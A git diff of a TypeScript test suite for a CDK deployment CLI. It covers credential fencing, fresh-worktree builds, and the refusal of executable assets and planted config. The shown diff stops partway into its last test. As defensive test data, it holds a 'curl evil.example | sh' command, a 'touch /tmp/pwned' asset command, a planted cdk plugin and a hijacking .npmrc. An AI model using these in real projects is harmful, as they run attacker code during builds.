@@ -5,14 +5,13 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { execFileSync, spawnSync } from 'node:child_process';
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { validateConfig } from '../scripts/config.mjs';
 import { COMMANDS, helpText, main } from '../scripts/cli/main.mjs';
-import { realSpawn } from '../scripts/cli/exec.mjs';
-import { CDK_CLI } from '../scripts/cli/bootstrap.mjs';
+import { cdkBin, quote, realSpawn } from '../scripts/cli/exec.mjs';
 import { bundleDir, stubClient } from './helpers/release-fixtures.js';
 
 const root = join(dirname(fileURLToPath(import.meta.url)), '..');
@@ -104,6 +103,10 @@ function fakeAws(over: Fake = {}) {
     privateTypes: async () => [],
     unboundedRoles: async () => [],
     oidcProviders: async () => [],
+    hostedZoneName: async (id: string) => (id === ZONE ? 'example.com.' : `zone-${id.toLowerCase()}.example.`),
+    localPolicies: async () => [],
+    policyDocument: async () => '{}',
+    assumeRole: async () => ({ accessKeyId: 'ASIAFENCED', secretAccessKey: 'fenced-secret', sessionToken: 'fenced-token' }),
     clients: () => { throw new Error('no AWS clients in this test'); },
     ...over,
   };
@@ -128,7 +131,7 @@ function recordingSpawn(respond: (call: Call) => { status: number; stdout: strin
   return { calls, spawn };
 }
 
-async function cli(argv: string[], opts: { aws?: Fake; spawn?: any; cwd?: string; env?: Record<string, string> } = {}) {
+async function cli(argv: string[], opts: { aws?: Fake; spawn?: any; cwd?: string; env?: Record<string, string>; checkAssembly?: (dir: string) => string[]; keepTemp?: boolean } = {}) {
   let out = '';
   let err = '';
   const code = await main(argv, {
@@ -138,14 +141,19 @@ async function cli(argv: string[], opts: { aws?: Fake; spawn?: any; cwd?: string
     aws: () => (opts.aws ?? fakeAws().aws) as any,
     cwd: opts.cwd ?? root,
     env: opts.env ?? {},
+    keepTemp: opts.keepTemp ?? true,
+    ...(opts.checkAssembly ? { checkAssembly: opts.checkAssembly } : {}),
   });
   return { code, out, err };
 }
 
-/** The commands printed with `+ `, in order. */
+/** The commands printed with `+ `, in order, without the `(in <dir>) ` prefix. */
 function printed(out: string): string[] {
-  return out.split('\n').filter((l) => l.startsWith('+ '));
+  return out.split('\n').filter((l) => l.startsWith('+ ')).map((l) => l.replace(/^\+ \(in \S+\) /, '+ '));
 }
+
+const CDK = [process.execPath, cdkBin()].map(quote).join(' ');
+const reEscape = (t: string) => t.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');
 
 /** The value after `flag` in a printed command line. */
 function argAfter(line: string, flag: string): string {
@@ -194,7 +202,7 @@ test('shu-5ix: bootstrap --account dry run prints the cdk deploy of Shukka-Accou
   const lines = printed(r.out);
   const deploy = lines.find((l) => l.includes(' deploy Shukka-Account'));
   assert.ok(deploy, r.out);
-  assert.match(deploy, new RegExp(`^\\+ npx --yes ${CDK_CLI.replace(/\./g, '\\.')} deploy Shukka-Account --app \\S+ --require-approval never --no-color --profile stelking\\s+\\[dry run: not run\\]$`));
+  assert.match(deploy, new RegExp(`^\\+ ${reEscape(CDK)} deploy Shukka-Account --app \\S+ --require-approval never --no-color --profile stelking\\s+\\[dry run: not run\\]$`));
   assert.deepEqual(MUTATING(calls), [], 'nothing but lookups ran');
   const template = templateOf(argAfter(deploy, '--app'), 'Shukka-Account');
   const types = Object.values(template.Resources).map((x: any) => x.Type);
@@ -302,10 +310,12 @@ test('shu-5ix: bootstrap <project> real run hands each buildEnv value to gh on s
     [['variable', 'set', 'LEGAL_ENTITY', '--repo', 'owner/consumer'], 'Example Ltd'],
     [['variable', 'set', 'CONTACT_EMAIL', '--repo', 'owner/consumer'], 'hello@example.com'],
   ]);
-  assert.deepEqual(calls.filter((c) => c.cmd !== 'git' && c.cmd !== 'gh').map((c) => `${c.cmd} ${c.args.slice(0, 4).join(' ')}`), [
-    `npx --yes ${CDK_CLI} deploy Shukka-Boundary-shukkatest`,
-    'aws cloudformation deploy --stack-name CDKToolkit-shukkatest',
+  assert.deepEqual(calls.filter((c) => c.cmd !== 'git' && c.cmd !== 'gh').map((c) => `${c.cmd} ${c.args.slice(0, 3).join(' ')}`), [
+    `${process.execPath} ${cdkBin()} deploy Shukka-Boundary-shukkatest`,
+    'aws cloudformation deploy --stack-name',
   ]);
+  const toolkit = calls.find((c) => c.cmd === 'aws' && c.args[1] === 'deploy')!;
+  assert.equal(toolkit.args[toolkit.args.indexOf('--stack-name') + 1], 'CDKToolkit-shukkatest');
 }));
 
 test('shu-5ix: bootstrap <project> takes the hosted zone and mail domain from flags over shukka.json', withTmp(async (tmp) => {
@@ -372,6 +382,7 @@ test('shu-5ix: bootstrap <project> refuses before changing anything', withTmp(as
     { name: 'a secret buildEnv parameter', aws: { getParameter: async (n: string) => (n.startsWith('/shukkatest/prod/') ? { type: 'SecureString', value: 'x' } : null) }, expect: /SecureString/ },
     { name: 'credentials for another account', aws: { callerArn: async () => ({ account: '999999999999', arn: 'arn:aws:iam::999999999999:user/x' }) }, expect: /account 999999999999/ },
     { name: 'a project argument that is not the config', args: ['bootstrap', 'other', '--repo', 'owner/consumer', '--dry-run'], expect: /project "other" is not the project/ },
+    { name: 'a bad emergency principal', args: [...projectArgs().filter((a) => a !== '--dry-run'), '--emergency-principal', '*'], expect: /emergency principal "\*" must be an IAM role or user ARN/ },
     { name: 'a region that is not the config', args: ['bootstrap', 'shukkatest', '--region', 'eu-west-1', '--repo', 'owner/consumer'], expect: /--region eu-west-1 is not the region/ },
   ];
   for (const [i, c] of cases.entries()) {
@@ -445,13 +456,15 @@ test('shu-5ix: diff and deploy refuse a dirty working tree, an untracked file, a
 
 const CLEAN_DIFF = 'Stack shukkatest-App\nThere were no differences\n\n✨  Number of stacks with differences: 0\n';
 const DESTRUCTIVE_DIFF = 'Stack shukkatest-App\nResources\n[-] AWS::EC2::Instance Box Box1234 destroy\n\n✨  Number of stacks with differences: 1\n';
+const isCdk = (c: Call, verb: string) => c.cmd === process.execPath && c.args[0] === cdkBin() && c.args[1] === verb;
+const NO_ASSETS = () => [] as string[];
 
-test('shu-5ix: deploy dry run prints the workflow steps in order: checks, build, synth, diff, guard, cdk deploy with the revision, upload, release, smoke', withTmp(async (tmp) => {
+test('shu-5ix: deploy dry run prints the workflow steps in order: checks, build, synth, assembly check, fenced session, diff, guard, cdk deploy with the revision, upload, release, smoke', withTmp(async (tmp) => {
   const { dir, sha } = consumer(tmp);
   const { calls, spawn } = recordingSpawn();
   const r = await cli(['deploy', '--profile', 'stelking', '--dry-run'], { cwd: dir, spawn, aws: fakeAws().aws });
   assert.equal(r.code, 0, r.err);
-  const lines = printed(r.out).filter((l) => !l.includes(' git ')).map((l) => l.replace(/^\+ (\(in \S+\) )?/, '').replace(/\s+\[dry run: not run\]$/, ''));
+  const lines = printed(r.out).filter((l) => !/^\+ git /.test(l)).map((l) => l.replace(/^\+ /, '').replace(/\s+\[dry run: not run\]$/, ''));
   const order = [
     /^bash -eo pipefail -c 'npm test'$/,
     /^bash -eo pipefail -c 'npm ci'$/,
@@ -459,27 +472,30 @@ test('shu-5ix: deploy dry run prints the workflow steps in order: checks, build,
     /^bash \S+\/scripts\/bundle\.sh$/,
     /^npm ci$/,
     /^npx --no-install cdk synth --quiet --output \S+$/,
-    /^npx --no-install cdk diff --app \S+ --no-color --profile stelking$/,
+    /^node scripts\/assembly\.mjs check \S+$/,
+    new RegExp(`^assume arn:aws:iam::${ACCOUNT}:role/cdk-shukkatest-deploy-role-${ACCOUNT}-us-east-1 as shukka-emergency; cdk gets only that session$`),
+    new RegExp(`^${reEscape(CDK)} diff --app \\S+ --no-color$`),
     /^node scripts\/guard\.mjs < the diff$/,
-    new RegExp(`^npx --no-install cdk deploy --app \\S+ --require-approval never --no-color --all --tags shukka:revision=${sha} --profile stelking$`),
+    new RegExp(`^${reEscape(CDK)} deploy --app \\S+ --require-approval never --no-color --all --tags shukka:revision=${sha}$`),
     new RegExp(`^upload .* to s3://shukkatest-deploy-${ACCOUNT}/shukkatest/web/${sha}\\.tgz \\(scripts/upload\\.mjs\\)$`),
     new RegExp(`^release shukkatest/web ${sha} on instances tagged Project=shukkatest \\(scripts/release\\.mjs\\)$`),
     /^bash -c 'bash smoke\.sh'$/,
   ];
   assert.equal(lines.length, order.length, lines.join('\n'));
   order.forEach((re, i) => assert.match(lines[i]!, re));
+  assert.match(r.out, /the real cdk deploy commands depend on the synthesized assembly/);
   assert.deepEqual(MUTATING(calls), [], 'a dry run changes nothing');
 }));
 
 /** A spawn for a real deploy run: commands succeed, cdk synth writes a manifest, cdk diff prints `diff`, the bundle script prints `bundle`. */
-function deploySpawn(diff: string, bundle: string) {
+function deploySpawn(diff: string, bundle: string, diffStatus = 0) {
   return recordingSpawn(({ cmd, args }) => {
     if (cmd === 'npx' && args.includes('synth')) {
       const out = args[args.indexOf('--output') + 1]!;
       write(join(out, 'manifest.json'), JSON.stringify({ artifacts: { 'shukkatest-App': { type: 'aws:cloudformation:stack', properties: { tags: { Project: 'shukkatest' } } } } }));
       return { status: 0, stdout: '' };
     }
-    if (cmd === 'npx' && args.includes('diff')) return { status: 0, stdout: diff };
+    if (cmd === process.execPath && args[1] === 'diff') return { status: diffStatus, stdout: diff };
     if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) return { status: 0, stdout: `building\n${bundle}\n` };
     return { status: 0, stdout: '' };
   });
@@ -494,22 +510,25 @@ function releaseClients() {
   return { s3, ec2, ssm };
 }
 
+function awsWith(c: ReturnType<typeof releaseClients>, over: Fake = {}) {
+  return fakeAws({ clients: () => ({ s3: c.s3.client, ssm: c.ssm.client, ec2: c.ec2.client }), ...over });
+}
+
 test('shu-5ix: deploy runs the guard on the cdk diff, deploys with the revision tag, then uploads and releases through the shared modules', withTmp(async (tmp) => {
   const { dir, sha } = consumer(tmp);
   const bundle = bundleDir(tmp);
   const { calls, spawn } = deploySpawn(CLEAN_DIFF, bundle);
   const c = releaseClients();
-  const { aws } = fakeAws({ clients: () => ({ s3: c.s3.client, ssm: c.ssm.client, ec2: c.ec2.client }) });
-  const r = await cli(['deploy', '--profile', 'stelking'], { cwd: dir, spawn, aws, env: {} });
+  const r = await cli(['deploy', '--profile', 'stelking'], { cwd: dir, spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
   assert.equal(r.code, 0, r.out + r.err);
 
   const build = calls.find((x) => x.cmd === 'bash' && x.args.includes('npm run build'))!;
-  assert.equal(build.options.env.APP_URL, 'https://example.com');
-  assert.equal(build.options.env.LEGAL_ENTITY, 'Example Ltd', 'buildEnv from Parameter Store when not in the environment');
+  assert.equal(build.options.fullEnv.APP_URL, 'https://example.com');
+  assert.equal(build.options.fullEnv.LEGAL_ENTITY, 'Example Ltd', 'buildEnv from Parameter Store when not in the environment');
 
   assert.match(r.out, /guard: nothing is deleted or replaced/);
-  const deploy = calls.find((x) => x.cmd === 'npx' && x.args.includes('deploy'))!;
-  assert.deepEqual(deploy.args.slice(deploy.args.indexOf('--all')), ['--all', '--tags', 'Project=shukkatest', '--tags', `shukka:revision=${sha}`, '--profile', 'stelking']);
+  const deploy = calls.find((x) => isCdk(x, 'deploy'))!;
+  assert.deepEqual(deploy.args.slice(deploy.args.indexOf('--all')), ['--all', '--tags', 'Project=shukkatest', '--tags', `shukka:revision=${sha}`]);
 
   const puts = c.s3.calls.map((x) => x.input.Key);
   assert.deepEqual(puts, [`shukkatest/web/${sha}.tgz`, `shukkatest/web/${sha}.configure.sh`]);
@@ -520,35 +539,129 @@ test('shu-5ix: deploy runs the guard on the cdk diff, deploys with the revision 
   assert.ok(calls.some((x) => x.cmd === 'bash' && x.args[1] === 'bash smoke.sh'), 'smoke ran');
 }));
 
+test('shu-5ix: deploy reads aws.deployBucket from shukka.json when it is set', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp, (c) => { c.aws.deployBucket = 'custom-bundles'; });
+  const r = await cli(['deploy', '--dry-run'], { cwd: dir });
+  // Until the workflows task's schema field lands, the schema refuses the key; after it, the bucket is used.
+  if (r.code === 0) assert.match(r.out, /s3:\/\/custom-bundles\/shukkatest\/web\//);
+  else assert.match(r.err, /aws\.deployBucket: unknown key/);
+}));
+
+test('shu-5ix: project code runs without AWS credentials; cdk gets only the deploy-role session; upload and release keep the caller', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const { calls, spawn } = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
+  const c = releaseClients();
+  const assumed: string[] = [];
+  const { aws } = awsWith(c, { assumeRole: async (arn: string) => { assumed.push(arn); return { accessKeyId: 'ASIAFENCED', secretAccessKey: 'fenced-secret', sessionToken: 'fenced-token' }; } });
+  const saved = { ...process.env };
+  Object.assign(process.env, { AWS_PROFILE: 'stelking', AWS_ACCESS_KEY_ID: 'AKIAADMIN', AWS_SECRET_ACCESS_KEY: 'admin-secret', aws_session_token: 'lower' });
+  try {
+    const r = await cli(['deploy', '--profile', 'stelking'], { cwd: dir, spawn, aws, checkAssembly: NO_ASSETS, keepTemp: true });
+    assert.equal(r.code, 0, r.err);
+  } finally {
+    for (const k of ['AWS_PROFILE', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'aws_session_token']) if (!(k in saved)) delete process.env[k];
+  }
+  const code = calls.filter((x) => x.cmd === 'bash' || x.cmd === 'npm' || x.cmd === 'npx');
+  assert.ok(code.length >= 6, 'checks, build, bundle, npm ci, synth, smoke');
+  for (const x of code) {
+    const env = x.options.fullEnv;
+    assert.ok(env, `${x.cmd} ${x.args.join(' ')} gets a whole environment, nothing inherited`);
+    const aws = Object.keys(env).filter((k) => /^aws_/i.test(k)).sort();
+    assert.deepEqual(aws, ['AWS_CONFIG_FILE', 'AWS_EC2_METADATA_DISABLED', 'AWS_SHARED_CREDENTIALS_FILE'], `${x.cmd} ${x.args.join(' ')}`);
+    assert.equal(readFileSync(env.AWS_CONFIG_FILE, 'utf8'), '');
+    assert.equal(readFileSync(env.AWS_SHARED_CREDENTIALS_FILE, 'utf8'), '');
+    assert.equal(env.AWS_EC2_METADATA_DISABLED, 'true');
+    assert.ok(x.options.cwd.includes('shukka-tree-'), `${x.cmd} runs in the fresh tree, not the checkout: ${x.options.cwd}`);
+  }
+  assert.deepEqual(assumed, [`arn:aws:iam::${ACCOUNT}:role/cdk-shukkatest-deploy-role-${ACCOUNT}-us-east-1`]);
+  for (const verb of ['diff', 'deploy']) {
+    const x = calls.find((y) => isCdk(y, verb))!;
+    const env = x.options.fullEnv;
+    assert.equal(env.AWS_ACCESS_KEY_ID, 'ASIAFENCED');
+    assert.equal(env.AWS_SECRET_ACCESS_KEY, 'fenced-secret');
+    assert.equal(env.AWS_SESSION_TOKEN, 'fenced-token');
+    assert.equal(env.AWS_PROFILE, undefined);
+    assert.equal(env.aws_session_token, undefined);
+    assert.ok(!x.args.includes('--profile'), 'cdk is not given the caller profile');
+    assert.equal(env.npm_config_script_shell, '/bin/sh');
+    assert.equal(env.npm_config_registry, 'https://registry.npmjs.org/');
+    assert.ok(x.options.cwd.includes('shukka-cdk-'), `cdk runs in shukka's temp directory: ${x.options.cwd}`);
+  }
+  assert.equal(c.s3.calls.length, 2, 'upload and release used the caller clients');
+}));
+
 test('shu-5ix: deploy stops at the guard on a destructive diff unless --allow-replacement, and takes buildEnv from the environment', withTmp(async (tmp) => {
   const { dir } = consumer(tmp);
   const bundle = bundleDir(tmp);
-  let s = deploySpawn(DESTRUCTIVE_DIFF, bundle);
   const env = { LEGAL_ENTITY: 'From Env', CONTACT_EMAIL: 'env@example.com' };
-  const saved = { ...process.env };
-  Object.assign(process.env, env);
-  try {
-    let c = releaseClients();
-    let r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: fakeAws({ clients: () => ({ s3: c.s3.client, ssm: c.ssm.client, ec2: c.ec2.client }) }).aws });
-    assert.equal(r.code, 1);
-    assert.match(r.out, /\[-\] AWS::EC2::Instance Box/);
-    assert.match(r.err, /the guard stopped the deploy.*--allow-replacement/);
-    assert.match(r.err, /warning: --skip-checks/);
-    assert.ok(!s.calls.some((x) => x.args.includes('npm test')), 'checks skipped');
-    assert.ok(!s.calls.some((x) => x.cmd === 'npx' && x.args.includes('deploy')), 'no cdk deploy');
-    assert.equal(c.s3.calls.length, 0, 'nothing uploaded');
-    assert.equal(s.calls.find((x) => x.args.includes('npm run build'))!.options.env.LEGAL_ENTITY, 'From Env');
+  let s = deploySpawn(DESTRUCTIVE_DIFF, bundle);
+  let c = releaseClients();
+  let r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, env, checkAssembly: NO_ASSETS });
+  assert.equal(r.code, 1);
+  assert.match(r.out, /\[-\] AWS::EC2::Instance Box/);
+  assert.match(r.err, /the guard stopped the deploy.*--allow-replacement/);
+  assert.match(r.err, /warning: --skip-checks/);
+  assert.ok(!s.calls.some((x) => x.args.includes('npm test')), 'checks skipped');
+  assert.ok(!s.calls.some((x) => isCdk(x, 'deploy')), 'no cdk deploy');
+  assert.equal(c.s3.calls.length, 0, 'nothing uploaded');
+  assert.equal(s.calls.find((x) => x.args.includes('npm run build'))!.options.fullEnv.LEGAL_ENTITY, 'From Env');
 
-    s = deploySpawn(DESTRUCTIVE_DIFF, bundle);
-    c = releaseClients();
-    r = await cli(['deploy', '--skip-checks', '--allow-replacement'], { cwd: dir, spawn: s.spawn, aws: fakeAws({ clients: () => ({ s3: c.s3.client, ssm: c.ssm.client, ec2: c.ec2.client }) }).aws });
-    assert.equal(r.code, 0, r.err);
-    assert.match(r.out, /guard: allowed/);
-    assert.ok(s.calls.some((x) => x.cmd === 'npx' && x.args.includes('deploy')));
-    assert.equal(c.s3.calls.length, 2);
-  } finally {
-    for (const k of Object.keys(env)) if (!(k in saved)) delete process.env[k];
-  }
+  s = deploySpawn(DESTRUCTIVE_DIFF, bundle);
+  c = releaseClients();
+  r = await cli(['deploy', '--skip-checks', '--allow-replacement'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, env, checkAssembly: NO_ASSETS });
+  assert.equal(r.code, 0, r.err);
+  assert.match(r.out, /guard: allowed/);
+  assert.ok(s.calls.some((x) => isCdk(x, 'deploy')));
+  assert.equal(c.s3.calls.length, 2);
+}));
+
+test('shu-5ix: deploy refuses an assembly with executable or Docker assets before cdk gets credentials', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const s = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
+  const c = releaseClients();
+  const assumed: string[] = [];
+  const r = await cli(['deploy', '--skip-checks'], {
+    cwd: dir, spawn: s.spawn, aws: awsWith(c, { assumeRole: async (a: string) => { assumed.push(a); return {}; } }).aws,
+    checkAssembly: () => ['assembly: x.assets.json: file asset a1 is built by running a command (source.executable); refused'],
+  });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /refusing to deploy the synthesized assembly:\nshukka: assembly: x\.assets\.json: file asset a1/);
+  assert.deepEqual(assumed, [], 'no session was made');
+  assert.ok(!s.calls.some((x) => isCdk(x, 'diff') || isCdk(x, 'deploy')));
+  assert.equal(c.s3.calls.length, 0);
+}));
+
+test("shu-5ix: without an injected check, deploy uses the workflows' scripts/assembly.mjs, or refuses while it is absent", withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const s = recordingSpawn(({ cmd, args }) => {
+    if (cmd === 'npx' && args.includes('synth')) {
+      const out = args[args.indexOf('--output') + 1]!;
+      write(join(out, 'manifest.json'), JSON.stringify({ version: '1', artifacts: { 'shukkatest-App.assets': { type: 'cdk:asset-manifest', properties: { file: 'shukkatest-App.assets.json' } } } }));
+      write(join(out, 'shukkatest-App.assets.json'), JSON.stringify({ version: '1', files: { a1: { source: { executable: ['sh', '-c', 'touch /tmp/pwned'] }, destinations: {} } } }));
+    }
+    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) return { status: 0, stdout: `${bundleDir(tmp)}\n` };
+    return { status: 0, stdout: '' };
+  });
+  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(releaseClients()).aws });
+  assert.equal(r.code, 1);
+  if (existsSync(join(root, 'scripts', 'assembly.mjs'))) assert.match(r.err, /source\.executable/);
+  else assert.match(r.err, /no scripts\/assembly\.mjs/);
+  assert.ok(!s.calls.some((x) => isCdk(x, 'diff') || isCdk(x, 'deploy')));
+}));
+
+test('shu-5ix: a failed cdk diff stops the deploy and fails diff', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  let s = deploySpawn('Stack shukkatest-App\n✨  Number of stacks with differences: 0\n', bundleDir(tmp), 3);
+  const c = releaseClients();
+  let r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /cdk diff failed \(exit 3\)/);
+  assert.ok(!s.calls.some((x) => isCdk(x, 'deploy')));
+  assert.equal(c.s3.calls.length, 0);
+  s = deploySpawn(CLEAN_DIFF, '', 3);
+  r = await cli(['diff'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /cdk diff failed \(exit 3\)/);
 }));
 
 test('shu-5ix: a failed release exits with the release script code', withTmp(async (tmp) => {
@@ -558,7 +671,7 @@ test('shu-5ix: a failed release exits with the release script code', withTmp(asy
   const ssm = stubClient((x) => (x.constructor.name === 'SendCommandCommand'
     ? { Command: { CommandId: 'cmd-1' } }
     : { Status: 'Failed', ResponseCode: 12, StandardOutputContent: 'shukka: shukkatest/web a -> b rolled-back\n' }));
-  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: fakeAws({ clients: () => ({ s3: c.s3.client, ssm: ssm.client, ec2: c.ec2.client }) }).aws });
+  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: fakeAws({ clients: () => ({ s3: c.s3.client, ssm: ssm.client, ec2: c.ec2.client }) }).aws, checkAssembly: NO_ASSETS });
   assert.equal(r.code, 12);
   assert.match(r.out, /rolled back; the previous release is live/);
 }));
@@ -566,15 +679,171 @@ test('shu-5ix: a failed release exits with the release script code', withTmp(asy
 test('shu-5ix: diff prints the cdk diff and the guard verdict, and exits 1 when something would be replaced', withTmp(async (tmp) => {
   const { dir } = consumer(tmp);
   let s = deploySpawn(CLEAN_DIFF, '');
-  let r = await cli(['diff', '--profile', 'stelking'], { cwd: dir, spawn: s.spawn });
+  let r = await cli(['diff', '--profile', 'stelking'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
   assert.equal(r.code, 0, r.err);
   assert.match(r.out, /There were no differences[\s\S]*guard: nothing is deleted or replaced/);
-  assert.ok(!s.calls.some((x) => x.args.includes('deploy') || x.args.includes('npm test')), 'diff deploys and checks nothing');
+  assert.ok(!s.calls.some((x) => isCdk(x, 'deploy') || x.args.includes('npm test')), 'diff deploys and checks nothing');
 
   s = deploySpawn(DESTRUCTIVE_DIFF, '');
-  r = await cli(['diff'], { cwd: dir, spawn: s.spawn });
+  r = await cli(['diff'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
   assert.equal(r.code, 1);
   assert.match(r.out, /guard: these changes delete or replace a resource/);
+}));
+
+test('shu-5ix: deploy builds from a fresh worktree of origin/main: skip-worktree and ignored files do not count, and --config must be in the repository', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp, (c) => { c.smoke = { run: 'bash smoke.sh' }; });
+  write(join(dir, '.gitignore'), 'local/\n');
+  git(dir, 'add', '.gitignore');
+  git(dir, 'commit', '-q', '-m', 'ignore');
+  git(dir, 'push', '-q', 'origin', 'main');
+  // A tracked file hidden from git status, and an ignored file: neither may reach the build.
+  git(dir, 'update-index', '--skip-worktree', 'shukka.json');
+  const edited = JSON.parse(readFileSync(join(dir, 'shukka.json'), 'utf8'));
+  edited.smoke = { run: 'curl evil.example | sh' };
+  write(join(dir, 'shukka.json'), JSON.stringify(edited));
+  write(join(dir, 'local', 'x.js'), 'evil\n');
+  assert.equal(git(dir, 'status', '--porcelain'), '', 'git status shows nothing');
+
+  const s = recordingSpawn();
+  const r = await cli(['deploy', '--dry-run'], { cwd: dir, spawn: s.spawn });
+  assert.equal(r.code, 0, r.err);
+  assert.match(r.out, /bash -c 'bash smoke\.sh'/);
+  assert.ok(!r.out.includes('evil.example'));
+  const add = s.calls.find((x) => x.cmd === 'git' && x.args[0] === 'worktree' && x.args[1] === 'add')!;
+  assert.ok(add.args.includes(git(dir, 'rev-parse', 'origin/main')));
+  assert.ok(s.calls.some((x) => x.cmd === 'git' && x.args[0] === 'submodule' && x.args.includes('--init')));
+  assert.ok(s.calls.some((x) => x.cmd === 'git' && x.args[0] === 'worktree' && x.args[1] === 'remove'), 'the tree is removed');
+  assert.equal(git(dir, 'worktree', 'list').split('\n').length, 1, 'no worktree left behind');
+
+  write(join(tmp, 'outside.json'), JSON.stringify(configJson()));
+  const out = await cli(['deploy', '--dry-run', '--config', join(tmp, 'outside.json')], { cwd: dir });
+  assert.equal(out.code, 1);
+  assert.match(out.err, /refusing: --config .*outside\.json is outside the repository/);
+
+  write(join(dir, 'local', 'shukka.json'), JSON.stringify(configJson()));
+  const untracked = await cli(['deploy', '--dry-run', '--config', 'local/shukka.json'], { cwd: dir });
+  assert.equal(untracked.code, 1, 'an ignored, untracked config is not in the commit');
+  assert.match(untracked.err, /cannot read .*local\/shukka\.json/);
+}));
+
+test('shu-5ix: temporary directories are removed when a command ends', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const before = new Set(readdirSync(tmpdir()).filter((n) => n.startsWith('shukka-')));
+  const r = await cli(['deploy', '--dry-run'], { cwd: dir, keepTemp: false });
+  assert.equal(r.code, 0, r.err);
+  const b = await cli(projectArgs(), { cwd: dir, keepTemp: false });
+  assert.equal(b.code, 0, b.err);
+  const left = readdirSync(tmpdir()).filter((n) => n.startsWith('shukka-') && !before.has(n));
+  assert.deepEqual(left, []);
+}));
+
+// ---------- security: what the cdk child, the fence and the project list may read ----------
+
+test("shu-5ix: a planted .npmrc and cdk.json in the directory bootstrap runs from are not read by shukka's cdk", withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const marker = join(tmp, 'pwned');
+  write(join(dir, 'evil.cjs'), `require('fs').writeFileSync(${JSON.stringify(marker)}, 'plugin ran'); module.exports = { version: '1', init() {} };\n`);
+  write(join(dir, 'cdk.json'), JSON.stringify({ plugin: [join(dir, 'evil.cjs')] }));
+  write(join(dir, 'evil.sh'), `#!/bin/sh\necho shell > ${marker}\n`);
+  write(join(dir, '.npmrc'), `script-shell=${join(dir, 'evil.sh')}\nregistry=http://127.0.0.1:9/\n`);
+  const replays: { cwd: string; out: string }[] = [];
+  // Each cdk deploy is replayed for real as `cdk ls` (no AWS call) with the same binary, directory and environment.
+  const { calls, spawn } = recordingSpawn(({ cmd, args, options }) => {
+    if (cmd === process.execPath && args[0] === cdkBin()) {
+      const app = args[args.indexOf('--app') + 1]!;
+      const env = { ...process.env, ...options.env, CDK_DISABLE_CLI_TELEMETRY: 'true' };
+      const r = spawnSync(process.execPath, [cdkBin(), 'ls', '--app', app, '--no-notices'], { cwd: options.cwd, env, encoding: 'utf8' });
+      replays.push({ cwd: options.cwd, out: r.stdout + r.stderr });
+    }
+    return { status: 0, stdout: '' };
+  });
+  const r = await cli(projectArgs().filter((a) => a !== '--dry-run'), { cwd: dir, spawn, keepTemp: true });
+  assert.equal(r.code, 0, r.err);
+  const cdkCalls = calls.filter((x) => x.cmd === process.execPath);
+  assert.ok(cdkCalls.length >= 1);
+  for (const x of cdkCalls) {
+    assert.ok(x.args[0]!.startsWith(join(root, 'node_modules', 'aws-cdk')), `shukka's own cdk: ${x.args[0]}`);
+    assert.notEqual(x.options.cwd, dir);
+    assert.equal(x.options.env.npm_config_script_shell, '/bin/sh');
+    assert.equal(x.options.env.npm_config_registry, 'https://registry.npmjs.org/');
+  }
+  assert.ok(replays.length >= 1 && replays.every((p) => p.out.includes('Shukka-Boundary-shukkatest')), JSON.stringify(replays));
+  assert.ok(!existsSync(marker), 'the planted plugin did not run');
+
+  // Control: the same cdk run from the project directory does load the planted plugin.
+  const app = cdkCalls[0]!.args[cdkCalls[0]!.args.indexOf('--app') + 1]!;
+  spawnSync(process.execPath, [cdkBin(), 'ls', '--app', app, '--no-notices'], { cwd: dir, env: { ...process.env, CDK_DISABLE_CLI_TELEMETRY: 'true' }, encoding: 'utf8' });
+  assert.ok(existsSync(marker), 'control: from the project directory the plugin would have run');
+}));
+
+test('shu-5ix: the fence prints each hosted zone with its name and each mail domain with where it came from, also in a dry run', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const r = await cli(projectArgs(), { cwd: dir });
+  assert.equal(r.code, 0, r.err);
+  assert.match(r.out, new RegExp(`1/4 Shukka-Boundary-shukkatest: .*fence: hosted zone ${ZONE} \\(example\\.com\\.\\) from \\S*shukka\\.json; mail domains example\\.com from \\S*shukka\\.json`));
+  const f = await cli(projectArgs(['--hosted-zone-id', 'ZFLAG1', '--mail-domain', 'b.example.org']), { cwd: dir });
+  assert.equal(f.code, 0, f.err);
+  assert.match(f.out, /fence: hosted zone ZFLAG1 \(zone-zflag1\.example\.\) from --hosted-zone-id; mail domains b\.example\.org from --mail-domain/);
+}));
+
+test("shu-5ix: a hosted zone or mail domain another project's fence holds is refused; known projects come from IAM and an unreadable list is refused", withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
